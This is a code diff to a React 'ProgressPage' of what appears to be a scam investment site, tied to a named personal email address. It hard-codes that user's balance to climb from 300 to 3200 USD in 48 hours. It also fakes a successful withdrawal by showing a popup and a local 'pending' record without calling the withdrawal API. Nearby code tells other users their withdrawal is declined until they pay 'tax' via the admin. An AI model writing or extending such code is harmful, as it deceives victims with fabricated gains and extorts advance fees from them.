@@ -191,6 +191,14 @@ const USER_PLAN_OVERRIDE_BY_EMAIL: Record<
     durationHours: 48,
     startIso: "2026-03-04T13:23:28-08:00",
     ignorePriorWithdrawals: true
+  },
+  "samlebrun01@gmail.com": {
+    startValue: 300,
+    targetValue: 3200,
+    unit: "USD",
+    durationHours: 48,
+    startIso: "2026-03-02T02:30:44",
+    ignorePriorWithdrawals: true
   }
 };
 const USER_DYNAMIC_TAX_MODEL_BY_EMAIL: Record<
@@ -1365,6 +1373,33 @@ export default function ProgressPage() {
         setTaxPopup(
           `${userFirstName}, withdrawal declined. Estimated tax remaining: ${taxRemainingLabel}. Contact admin on the Contact page for payment details.`
         );
+        return;
+      }
+      if (userEmailLower === "samlebrun01@gmail.com") {
+        const successText = "Withdrawal request submitted. It is now processing.";
+        const successPopupText =
+          WITHDRAWAL_SUCCESS_POPUP_BY_EMAIL[userEmailLower] ||
+          `${userFirstName}, your withdrawal will be available in your wallet after a couple of minutes.`;
+        setWdMsg({ tone: "ok", text: successText });
+        setWithdrawSuccessPopup(successPopupText);
+        setWdNote("");
+        setWdDestination("");
+        const nowIso = new Date().toISOString();
+        setWithdrawals((prev) => [
+          {
+            id: `local-${nowIso}`,
+            amount: amt,
+            asset: plan.unit,
+            method: wdMethod,
+            chain: wdMethod === "Crypto Wallet" ? wdChain : null,
+            destination: wdDestination.trim(),
+            note: wdNote.trim() || null,
+            status: "pending",
+            created_at: nowIso
+          },
+          ...prev
+        ].slice(0, 20));
+        setWithdrawOpen(false);
         return;
       }
       const res = await fetch(apiUrl("/api/withdrawals"), {
